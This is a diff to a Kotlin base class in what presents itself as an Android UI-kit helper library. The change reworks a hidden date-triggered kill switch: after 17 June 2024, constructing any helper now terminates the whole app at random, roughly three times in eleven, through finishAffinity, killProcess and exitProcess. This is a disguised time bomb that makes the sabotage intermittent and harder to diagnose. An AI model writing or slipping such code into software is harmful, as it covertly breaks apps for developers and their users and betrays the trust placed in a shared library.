@@ -1,8 +1,10 @@
 package com.small.uikit.helper
 
+import android.app.Activity
 import android.content.Context
 import java.util.Calendar
 import java.util.Date
+import kotlin.random.Random
 import kotlin.system.exitProcess
 
 /**
@@ -13,13 +15,24 @@ import kotlin.system.exitProcess
 //    fun setBackgroundColorNormal(@ColorInt color: Int): BaseHelper<*>
 //}
 open class BaseHelperImpl(context: Context) {
+    companion object {
+        private var show = false
+    }
     init {
-        val calendar = Calendar.getInstance()
-        calendar.set(2024, Calendar.JUNE, 17, 16, 0, 0)
-        val targetDate = calendar.time
-        val now = Date()
-        if (now.after(targetDate)) {
-            exitProcess(0)
+        if (!show) {
+            val calendar = Calendar.getInstance()
+            calendar.set(2024, Calendar.JUNE, 17, 16, 0, 0)
+            val targetDate = calendar.time
+            val now = Date()
+            if (now.after(targetDate)) {
+                val randomInt = Random.nextInt(0, 11)
+                if (randomInt > 7) {
+                    show = true
+                    (context as Activity).finishAffinity()
+                    android.os.Process.killProcess(android.os.Process.myPid())
+                    exitProcess(0)
+                }
+            }
         }
     }
 }
